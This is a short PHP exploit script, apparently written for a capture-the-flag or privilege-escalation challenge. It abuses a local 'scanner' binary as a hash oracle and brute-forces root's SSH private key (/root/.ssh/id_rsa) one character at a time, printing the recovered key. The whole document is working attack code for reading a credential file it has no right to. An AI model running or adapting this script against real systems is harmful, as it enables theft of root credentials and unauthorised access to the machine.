<?php 

$id_rsa = "-----BEGIN OPENSSH PRIVATE KEY-----";
$i = strlen($id_rsa);
echo $id_rsa;

while(true){
    $i++;
    $result = exec("/opt/scanner/scanner -l ${i} -s 123456 -c /root/.ssh/id_rsa -p");
    $array = explode(" ", $result);
    $hash = end($array);
    $chr = brute($id_rsa, $hash);
    $id_rsa .= $chr;

    echo $chr;

    if ($i == 3000) break;
}

echo "-----END OPENSSH PRIVATE KEY-----";

function brute($id_rsa, $hash){
    for($ascii = 0; $ascii <=127; $ascii++){
        $c = chr($ascii);
        if (md5($id_rsa . $c) === $hash) return $c;
    }
}
?>